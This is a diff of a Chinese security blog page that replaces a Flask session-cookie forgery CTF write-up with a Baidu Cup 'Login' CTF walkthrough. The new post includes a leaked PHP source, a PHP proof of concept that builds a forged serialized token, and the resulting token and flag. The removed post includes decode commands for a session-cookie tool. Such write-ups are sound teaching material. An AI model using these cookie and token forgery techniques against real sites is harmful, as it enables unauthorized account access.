@@ -15,28 +15,23 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="Flask的session是存储在客户端，拿到目标session安全秘钥后使用脚本结合秘钥解密前端cookie中的session值，通过修改数据等操作来达到越权的效果。">
+<meta name="description" content="细心查看源代码，细心查看HTTP头部字段，代码审计取精华部分审计。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flask_Session缺陷_CTF">
-<meta property="og:url" content="https://www.tu3k.cn/2021/03/26/flask-session-decode-ctf/index.html">
+<meta property="og:title" content="百度杯CTF_Login">
+<meta property="og:url" content="https://www.tu3k.cn/2021/04/15/ctf-login/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="Flask的session是存储在客户端，拿到目标session安全秘钥后使用脚本结合秘钥解密前端cookie中的session值，通过修改数据等操作来达到越权的效果。">
+<meta property="og:description" content="细心查看源代码，细心查看HTTP头部字段，代码审计取精华部分审计。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/7.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/8.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/9.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/10.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/12.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/13.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/14.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/15.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/16.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/18.png">
-<meta property="article:published_time" content="2021-03-26T02:49:16.000Z">
-<meta property="article:modified_time" content="2021-03-26T04:12:27.776Z">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/90.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/91.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/92.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/93.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/94.png">
+<meta property="article:published_time" content="2021-04-15T08:37:36.000Z">
+<meta property="article:modified_time" content="2021-04-15T09:02:32.650Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/php_web_ctf/7.png">
+<meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf/90.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -70,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Flask_Session缺陷_CTF | Tu3k's Blog</title>
+<title>百度杯CTF_Login | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -279,11 +274,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-flask-session-decode-ctf" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ctf-login" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/03/26/flask-session-decode-ctf/" class="article-date">
-      <time datetime="2021-03-26T02:49:16.000Z" itemprop="datePublished">2021-03-26</time>
+      <a href="/2021/04/15/ctf-login/" class="article-date">
+      <time datetime="2021-04-15T08:37:36.000Z" itemprop="datePublished">2021-04-15</time>
 </a>
 
 
@@ -298,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Flask_Session缺陷_CTF
+      百度杯CTF_Login
     </h1>
   
 
@@ -319,11 +314,18 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <p>Flask的session是存储在客户端，拿到目标session安全秘钥后使用脚本结合秘钥解密前端cookie中的session值，通过修改数据等操作来达到越权的效果。</p>
+        <p>细心查看源代码，细心查看HTTP头部字段，代码审计取精华部分审计。</p>
 <a id="more"></a>
-
-<h3 id="ADMIN"><a href="#ADMIN" class="headerlink" title="ADMIN"></a>ADMIN</h3><p>拿到目标站后，界面是这样的，查看源代码发现一句注释<br><code>you are not admin!</code><br>前端有注册和登录，猜测如果登录的是admin用户，看到的东西就和普通注册用户不一样<br><img src="https://www.tu3k.cn/images/php_web_ctf/7.png" alt="flask_ctf" title="flask_ctf"><br>注册登录了个普通账户，期间测试了SQL，越权，XSS等均无果，在修改密码界面看了下源代码，发现了程序源码github地址，是基于Flask框架，下载<br><img src="https://www.tu3k.cn/images/php_web_ctf/8.png" alt="flask_ctf" title="flask_ctf"><br>先去看下路由，基本没什么可利用的<br><img src="https://www.tu3k.cn/images/php_web_ctf/9.png" alt="flask_ctf" title="flask_ctf"><br>又看了下模板文件，在首页模板处发现,只要用户是 admin，就出flag<br><img src="https://www.tu3k.cn/images/php_web_ctf/10.png" alt="flask_ctf" title="flask_ctf"><br>那么我们只需将flask前端cookie中的session给解密出然后替换用户名再加密后，使用网页端修改session的工具修改，访问即可获取flag<br>首先在配置文件中找到session安全秘钥：<br><img src="https://www.tu3k.cn/images/php_web_ctf/12.png" alt="flask_ctf" title="flask_ctf"><br>再使用flask session解码工具：<br><code>https://github.com/noraj/flask-session-cookie-manager</code><br>切换到工具目录，安装<br><code>python3 setup.py install</code><br>使用命令解码：<br><code>python3 flask_session_cookie_manager3.py decode -s session安全秘钥 -c 前端cookie中加密的session</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/13.png" alt="flask_ctf" title="flask_ctf"><br>修改用户为admin<br><img src="https://www.tu3k.cn/images/php_web_ctf/14.png" alt="flask_ctf" title="flask_ctf"><br>加密还原session：<br><img src="https://www.tu3k.cn/images/php_web_ctf/15.png" alt="flask_ctf" title="flask_ctf"><br>替换session<br><img src="https://www.tu3k.cn/images/php_web_ctf/16.png" alt="flask_ctf" title="flask_ctf"><br>刷新网页即可获取Flag<br><img src="https://www.tu3k.cn/images/php_web_ctf/18.png" alt="flask_ctf" title="flask_ctf"></p>
-<p>奇怪的知识又add</p>
+<h3 id="听歌吧不多说了-《你说-——-枯木逢春》-Music-Start！"><a href="#听歌吧不多说了-《你说-——-枯木逢春》-Music-Start！" class="headerlink" title="听歌吧不多说了 《你说 —— 枯木逢春》 Music Start！"></a>听歌吧不多说了 《你说 —— 枯木逢春》 Music Start！</h3><p>开局一个登陆页面，测试sql注入，弱口令爆破，修改返回包无果<br><img src="http://www.tu3k.cn/images/php_web_ctf/90.png" alt="ctf_login" title="login"><br>查看源代码，一开始没发现什么东西，拉到最下面发现疑似账号密码 test1 test1<br>这得多细啊..<br><img src="http://www.tu3k.cn/images/php_web_ctf/91.png" alt="ctf_login" title="login"><br>登陆成功，页面显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(╯‵□′)╯︵┴─┴</span><br></pre></td></tr></table></figure>
+<p>看源代码，没啥东西，测试下robots和信息泄露也没有<br>对这个页面抓下包看看<br><img src="http://www.tu3k.cn/images/php_web_ctf/92.png" alt="ctf_login" title="login"><br>发现响应头有个陌生字段 show: 0<br>尝试加在请求头中,页面没变，把0改成1再次发送，源码出来了。<br><img src="http://www.tu3k.cn/images/php_web_ctf/93.png" alt="ctf_login" title="login"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &#39;common.php&#39;;</span><br><span class="line">	$requset &#x3D; array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	class db</span><br><span class="line">	&#123;</span><br><span class="line">		public $where;</span><br><span class="line">		function __wakeup()</span><br><span class="line">		&#123;</span><br><span class="line">			if(!empty($this-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;select($this-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function select($where)</span><br><span class="line">		&#123;</span><br><span class="line">			$sql &#x3D; mysql_query(&#39;select * from user where &#39;.$where);</span><br><span class="line">			return @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(isset($requset[&#39;token&#39;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">		$db &#x3D; new db();</span><br><span class="line">		$row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">		if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $flag;</span><br><span class="line">		&#125;else if($row[&#39;pass&#39;] !&#x3D;&#x3D; $login[&#39;pass&#39;])&#123;</span><br><span class="line">			echo &#39;unserialize injection!!&#39;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&#39;Location: index.php?error&#x3D;1&#39;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1、接受所有传参方式传来的值并拼接到数组中<br>2、定义了一个用来接收查询条件、查询数据的类<br>3、将请求包中的token值进行各种解密处理，带入查询类中进行查询<br>4、判断获取flag的条件</p>
+<h3 id="Getflag，Music-End！I-Just-Say-End…"><a href="#Getflag，Music-End！I-Just-Say-End…" class="headerlink" title="Getflag，Music End！I Just Say..End…"></a>Getflag，Music End！I Just Say..End…</h3><p>上面的核心代码是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">$db &#x3D; new db();</span><br><span class="line">$row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">	echo $flag;</span><br></pre></td></tr></table></figure>
+<p>对请求体中的token进行了各种解密，如果解密后的user===’ichunqiu’，就可以拿到flag了<br>反向写个加密规则出来让 user=ichunqiu 并加密即可<br>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$user &#x3D; array(&quot;user&quot;&#x3D;&gt;&quot;ichunqiu&quot;);</span><br><span class="line">	$dj &#x3D; base64_encode(gzcompress(serialize($user)));</span><br><span class="line">	echo $dj;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到<br><code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>带入到cookie中即可<br><img src="http://www.tu3k.cn/images/php_web_ctf/94.png" alt="ctf_login" title="login"><br>flag{dcc474ab-5e17-42b6-ad01-bdf0c8ec2882}</p>
 
     
 </div>
@@ -332,13 +334,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/03/26/flask-session-decode-ctf/">Flask_Session缺陷_CTF</a></p>
+        <p><span>Title:</span><a href="/2021/04/15/ctf-login/">百度杯CTF_Login</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-03-26, 10:49:16</p>
-        <p><span>Updated:</span>2021-03-26, 12:12:27</p>
+        <p><span>Created:</span>2021-04-15, 16:37:36</p>
+        <p><span>Updated:</span>2021-04-15, 17:02:32</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/03/26/flask-session-decode-ctf/" title="Flask_Session缺陷_CTF">https://www.tu3k.cn/2021/03/26/flask-session-decode-ctf/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/26/flask-session-decode-ctf/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/04/15/ctf-login/" title="百度杯CTF_Login">https://www.tu3k.cn/2021/04/15/ctf-login/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/15/ctf-login/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -350,16 +352,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/03/26/php-nizhuansiwei-ctf/">
-                    PHP逆转思维_CTF
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/03/25/php-serialize-ctf/">
-                    PHP反序列化_CTF2
+                <a href="/2021/04/15/ctf-123/">
+                    i春秋CTF_123
                 </a>
             </div>
         
@@ -371,7 +367,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ADMIN"><span class="toc-number">1.</span> <span class="toc-text">ADMIN</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AC%E6%AD%8C%E5%90%A7%E4%B8%8D%E5%A4%9A%E8%AF%B4%E4%BA%86-%E3%80%8A%E4%BD%A0%E8%AF%B4-%E2%80%94%E2%80%94-%E6%9E%AF%E6%9C%A8%E9%80%A2%E6%98%A5%E3%80%8B-Music-Start%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">听歌吧不多说了 《你说 —— 枯木逢春》 Music Start！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getflag%EF%BC%8CMusic-End%EF%BC%81I-Just-Say-End%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">Getflag，Music End！I Just Say..End…</span></a></li></ol>
         
     </div>
     <style>
@@ -407,7 +403,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Flask_Session缺陷_CTF　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"百度杯CTF_Login　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -427,15 +423,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/03/26/php-nizhuansiwei-ctf/" title="Pre: PHP逆转思维_CTF">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/03/25/php-serialize-ctf/" title="Next: PHP反序列化_CTF2">
+            <a href="/2021/04/15/ctf-123/" title="Next: i春秋CTF_123">
                 <i class="fa fa-angle-right"></i>
             </a>
         
